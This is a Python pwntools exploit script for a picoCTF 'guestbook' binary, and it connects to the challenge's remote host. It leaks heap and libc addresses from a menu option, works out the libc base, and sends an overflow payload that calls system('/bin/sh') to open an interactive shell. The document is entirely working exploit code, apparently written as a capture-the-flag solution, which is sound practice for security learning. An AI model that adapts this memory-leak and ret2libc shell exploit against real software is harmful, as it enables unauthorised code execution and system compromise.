#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./guestbook_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

info = lambda msg, x: log.info(msg + ": " + hex(x))
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

if args.REMOTE:
    p = remote("rhea.picoctf.net", 53917)
else:
    p = process()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        p 0x000007C2
        b*main-$1+0x000009C5
	    c
	''')
    #input()

[sla(b">>>", b"a") for i in range(4)]

sla(b">>", b'1')
sla(b">>>", b'6')

data = p.recv(timeout=1)
heap = u32(data[0:4])
info("heap", heap)
system = u32(data[20:24])
info("system", system)
libc.address = system - libc.sym['system']
info('libc base', libc.address)

sl(b'2')
sla(b">>>", b'0')
payload = b'A'*100 + p32(0) + p32(2) + p32(heap)*4 + b'B'*0x1c + b'C'*4 
payload += p32(system) + p32(0) + p32(next(libc.search(b"/bin/sh\0")))
sla(b">>>", payload)
sl()

sla(b">>", b'3')



p.interactive()
